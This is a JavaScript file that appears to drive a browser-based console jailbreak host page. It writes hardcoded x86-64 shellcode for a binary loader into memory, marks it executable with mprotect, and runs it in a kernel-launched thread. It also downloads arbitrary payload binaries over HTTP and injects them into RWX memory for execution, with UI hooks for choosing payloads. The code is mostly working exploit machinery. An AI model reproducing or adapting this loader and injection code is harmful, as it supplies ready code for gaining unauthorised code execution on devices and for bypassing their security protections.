/* eslint camelcase: ["error", {allow: ["payload_buffer", "payload_loader", "loader_writer"]}] */

/* eslint-disable no-bitwise, no-lone-blocks, max-len */

/* global chain, p, libKernelBase, OFFSET_lk_pthread_create, poc */

const zJbStatus = document.getElementById('zJbStatus');
const zMenu = document.getElementById('zMenu');
const zPlStatus = document.getElementById('zPlStatus');

/* exposed */

/* eslint-disable-next-line no-unused-vars */
const usbWaitTime = 10 * 1000;

/* eslint-disable-next-line no-unused-vars */
const disableUSB = () => {
  const xhr = new XMLHttpRequest();
  xhr.open('POST', '/admin/usb/off', true);
  xhr.send(null);
};

/* eslint-disable-next-line no-unused-vars */
const enableUSB = () => new Promise((resolve, reject) => {
  const xhr = new XMLHttpRequest();
  xhr.open('POST', '/admin/usb/on', true);
  xhr.onreadystatechange = () => {
    if (xhr.readyState !== 4) {
      return;
    }

    if (xhr.status === 200) {
      resolve();
    } else {
      reject(new Error(`${xhr.statusText} ${xhr.responseText}`));
    }
  };
  xhr.send(null);
});

/* eslint-disable-next-line no-unused-vars */
const deviceSleep = () => {
  const xhr = new XMLHttpRequest();
  xhr.open('POST', '/admin/device/powersave', true);
  xhr.send(null);
};

/* eslint-disable-next-line no-unused-vars */
const sleep = (ms) => new Promise((resolve) => {
  setTimeout(resolve, ms);
});

/* eslint-disable-next-line no-unused-vars */
const injectBinLoader = () => {
  const payload_buffer = chain.syscall(477, 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
  const payload_loader = p.malloc32(0x1000);

  const loader_writer = payload_loader.backing;
  loader_writer[0] = 0x56415741;
  loader_writer[1] = 0x83485541;
  loader_writer[2] = 0x894818EC;
  loader_writer[3] = 0xC748243C;
  loader_writer[4] = 0x10082444;
  loader_writer[5] = 0x483C2302;
  loader_writer[6] = 0x102444C7;
  loader_writer[7] = 0x00000000;
  loader_writer[8] = 0x000002BF;
  loader_writer[9] = 0x0001BE00;
  loader_writer[10] = 0xD2310000;
  loader_writer[11] = 0x00009CE8;
  loader_writer[12] = 0xC7894100;
  loader_writer[13] = 0x8D48C789;
  loader_writer[14] = 0xBA082474;
  loader_writer[15] = 0x00000010;
  loader_writer[16] = 0x000095E8;
  loader_writer[17] = 0xFF894400;
  loader_writer[18] = 0x000001BE;
  loader_writer[19] = 0x0095E800;
  loader_writer[20] = 0x89440000;
  loader_writer[21] = 0x31F631FF;
  loader_writer[22] = 0x0062E8D2;
  loader_writer[23] = 0x89410000;
  loader_writer[24] = 0x2C8B4CC6;
  loader_writer[25] = 0x45C64124;
  loader_writer[26] = 0x05EBC300;
  loader_writer[27] = 0x01499848;
  loader_writer[28] = 0xF78944C5;
  loader_writer[29] = 0xBAEE894C;
  loader_writer[30] = 0x00001000;
  loader_writer[31] = 0x000025E8;
  loader_writer[32] = 0x7FC08500;
  loader_writer[33] = 0xFF8944E7;
  loader_writer[34] = 0x000026E8;
  loader_writer[35] = 0xF7894400;
  loader_writer[36] = 0x00001EE8;
  loader_writer[37] = 0x2414FF00;
  loader_writer[38] = 0x18C48348;
  loader_writer[39] = 0x5E415D41;
  loader_writer[40] = 0x31485F41;
  loader_writer[41] = 0xC748C3C0;
  loader_writer[42] = 0x000003C0;
  loader_writer[43] = 0xCA894900;
  loader_writer[44] = 0x48C3050F;
  loader_writer[45] = 0x0006C0C7;
  loader_writer[46] = 0x89490000;
  loader_writer[47] = 0xC3050FCA;
  loader_writer[48] = 0x1EC0C748;
  loader_writer[49] = 0x49000000;
  loader_writer[50] = 0x050FCA89;
  loader_writer[51] = 0xC0C748C3;
  loader_writer[52] = 0x00000061;
  loader_writer[53] = 0x0FCA8949;
  loader_writer[54] = 0xC748C305;
  loader_writer[55] = 0x000068C0;
  loader_writer[56] = 0xCA894900;
  loader_writer[57] = 0x48C3050F;
  loader_writer[58] = 0x006AC0C7;
  loader_writer[59] = 0x89490000;
  loader_writer[60] = 0xC3050FCA;
  chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));

  const pthread = p.malloc(0x10);
  //
  {
    chain.fcall(window.syscalls[203], payload_buffer, 0x300000);
    chain.fcall(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
  }
  chain.run();
};

/* eslint-disable-next-line no-unused-vars */
const jailbreakDone = () => {
  zJbStatus.className = 'done';
  zJbStatus.textContent = 'Success';

  zMenu.className = '';
};

/* internals */

const zOnError = (e) => {
  zJbStatus.className = 'fail';
  zJbStatus.textContent = `Fail: ${e.message || e.reason || e}`;
};

window.addEventListener('error', zOnError, false);
window.addEventListener('unhandledrejection', zOnError, false);

const zGetPayload = (url) => new Promise((resolve, reject) => {
  const xhr = new XMLHttpRequest();
  xhr.responseType = 'arraybuffer';
  xhr.open('GET', url, true);
  xhr.send();
  xhr.onreadystatechange = () => {
    if (xhr.readyState !== 4) {
      return;
    }
    if (xhr.status === 200) {
      resolve(xhr.response);
    } else {
      reject(new Error('Load fail'));
    }
  };
});

const zInjectPayload = (PLS) => {
  const payload_buffer = chain.syscall(477, 0, 0x300000, 7, 0x1002, -1, 0);
  const pl = p.array_from_address(payload_buffer, PLS.byteLength * 4);
  const buf = new Uint32Array(PLS);
  pl.set(buf, 0);
  const pthread = p.malloc(0x10);
  chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
};

const zProxy = (className, fn) => (e) => {
  const {
    target,
  } = e;

  if (target.classList.contains(className)) {
    fn(target);
  }
};

let zPayloadLock = false;

const zPlStatusPrio = {
  className: 'pending',
  textContent: 'Please select button',
};

const zOnClickButton = zProxy('btn-payload', async (btn) => {
  const name = btn.textContent.trim();
  //   const desc = btn.getAttribute('data-desc');
  const custom = btn.getAttribute('data-custom');
  const bin = btn.getAttribute('data-bin');
  const msg = btn.getAttribute('data-msg');

  zPayloadLock = true;

  zPlStatus.className = 'running';

  zPlStatus.textContent = `${name} loading... please wait`;

  try {
    if (bin) {
      const ab = await zGetPayload(bin);
      zInjectPayload(ab);
    }

    if (custom) {
      window.custom();
    }

    zPlStatus.className = 'done';
    zPlStatus.textContent = msg || `${name} loaded`;
  } catch (e) {
    zPlStatus.className = 'fail';
    zPlStatus.textContent = `Error running ${name}: ${e.message}`;
  }

  zPlStatusPrio.className = zPlStatus.className;
  zPlStatusPrio.textContent = zPlStatus.textContent;

  zPayloadLock = false;
});

const zOnHoverButton = zProxy('btn-payload', (btn) => {
  if (zPayloadLock) {
    return;
  }

  const desc = btn.getAttribute('data-desc');

  zPlStatus.className = '';
  zPlStatus.textContent = desc;
});

const zOnLeaveButton = zProxy('btn-payload', () => {
  if (zPayloadLock) {
    return;
  }

  zPlStatus.className = zPlStatusPrio.className;
  zPlStatus.textContent = zPlStatusPrio.textContent;
});

const zIsReady = () => document.readyState === 'complete';

const zReady = (fn) => {
  if (zIsReady()) {
    setTimeout(fn, 100);
    return;
  }
  const proxyFn = () => {
    if (!zIsReady()) {
      return;
    }
    setTimeout(fn, 100);
    document.removeEventListener('DOMContentLoaded', proxyFn, false);
    window.removeEventListener('load', proxyFn, false);
  };
  document.addEventListener('DOMContentLoaded', proxyFn, false);
  window.addEventListener('load', proxyFn, false);
};

const zMain = () => {
  zMenu.addEventListener('click', zOnClickButton, false);
  zMenu.addEventListener('mouseover', zOnHoverButton, false);
  zMenu.addEventListener('mouseout', zOnLeaveButton, false);

  poc();
};

zReady(() => {
  zMain();
});
